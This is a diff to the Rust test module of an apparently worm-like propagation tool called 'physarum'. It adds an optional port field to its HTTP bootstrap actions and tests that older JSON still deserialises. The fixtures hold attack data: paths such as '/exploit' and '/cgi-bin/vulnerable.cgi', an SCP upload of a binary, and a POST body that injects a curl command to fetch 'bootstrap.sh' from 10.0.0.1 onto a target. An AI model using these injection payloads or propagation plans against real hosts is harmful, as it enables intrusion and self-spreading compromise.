@@ -96,9 +96,20 @@ mod tests {
         round_trip(&BootstrapAction::HttpPost {
             path: "/exploit".into(),
             body: "cmd=id".into(),
+            port: None,
+        });
+        round_trip(&BootstrapAction::HttpPost {
+            path: "/upload".into(),
+            body: "cmd=id".into(),
+            port: Some(8080),
         });
         round_trip(&BootstrapAction::HttpGet {
             path: "/shell".into(),
+            port: None,
+        });
+        round_trip(&BootstrapAction::HttpGet {
+            path: "/probe".into(),
+            port: Some(7777),
         });
         round_trip(&BootstrapAction::ScpUpload {
             local_path: "/tmp/physarum-maze".into(),
@@ -147,6 +158,7 @@ mod tests {
                 path: "/cgi-bin/vulnerable.cgi".into(),
                 http_method: crate::types::HttpMethod::Get,
                 headers: vec![("User-Agent".into(), "physarum/0.1".into())],
+                port: Some(8080),
             },
             artifact_type: ArtifactType::HttpRequest,
             bootstrap_plan: None,
@@ -200,6 +212,7 @@ mod tests {
                 path: "/cgi-bin/exploit".into(),
                 http_method: crate::types::HttpMethod::Post,
                 headers: vec![],
+                port: Some(80),
             },
             artifact_type: ArtifactType::Script,
             bootstrap_plan: Some(BootstrapPlan {
@@ -208,6 +221,7 @@ mod tests {
                         action: BootstrapAction::HttpPost {
                             path: "/cgi-bin/exploit".into(),
                             body: "cmd=curl+http://10.0.0.1/bootstrap.sh+-o+/tmp/bs.sh".into(),
+                            port: Some(80),
                         },
                         target: "10.0.0.2:80".into(),
                         timeout_ms: 5000,
@@ -517,5 +531,41 @@ mod tests {
         let q: DiscoveryQuery =
             serde_json::from_str(json).expect("must deserialise without pattern_findings");
         assert!(q.pattern_findings.is_empty());
+    }
+
+    // ── Port field backward compat ────────────────────────────────────────────
+
+    #[test]
+    fn http_action_without_port_deserialises_to_none() {
+        // Pre-PF-4 lineage JSON has no "port" key in HttpGet/HttpPost — must round-trip.
+        let json = r#"{"HttpGet":{"path":"/"}}"#;
+        let action: BootstrapAction = serde_json::from_str(json).unwrap();
+        assert!(matches!(
+            action,
+            BootstrapAction::HttpGet { port: None, .. }
+        ));
+    }
+
+    #[test]
+    fn http_method_without_port_deserialises_to_none() {
+        let json = r#"{"Http":{"path":"/","http_method":"Get","headers":[]}}"#;
+        let method: PropagationMethod = serde_json::from_str(json).unwrap();
+        assert!(matches!(method, PropagationMethod::Http { port: None, .. }));
+    }
+
+    #[test]
+    fn http_action_port_serialised_only_when_set() {
+        let with_port = BootstrapAction::HttpGet {
+            path: "/".into(),
+            port: Some(8080),
+        };
+        let without_port = BootstrapAction::HttpGet {
+            path: "/".into(),
+            port: None,
+        };
+        let json_with = serde_json::to_string(&with_port).unwrap();
+        let json_without = serde_json::to_string(&without_port).unwrap();
+        assert!(json_with.contains("8080"));
+        assert!(!json_without.contains("port"));
     }
 }
